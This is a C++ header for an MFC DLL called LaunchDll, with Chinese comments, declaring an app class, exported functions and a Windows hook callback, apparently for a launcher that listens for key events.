// LaunchDll.h : LaunchDll DLL 的主头文件
//

#pragma once

#ifndef __AFXWIN_H__
	#error "在包含此文件之前包含“stdafx.h”以生成 PCH 文件"
#endif
#define DllExport __declspec(dllexport) 
#include "resource.h"		// 主符号


// CLaunchDllApp
// 有关此类实现的信息，请参阅 LaunchDll.cpp
//
DllExport void WINAPI InstallLaunchEv();
class CLaunchDllApp : public CWinApp
{
public:
	CLaunchDllApp();

// 重写
public:
	virtual BOOL InitInstance();

	DECLARE_MESSAGE_MAP()
};
HWND hWnd = 0;
long Msg = 0;
bool shift = false;
HHOOK Hook;
DllExport void RegistMsg(HWND hwnd, long Msg);
LRESULT CALLBACK LauncherHook(int nCode, WPARAM wParam, LPARAM lParam);
void SaveLog(char* c);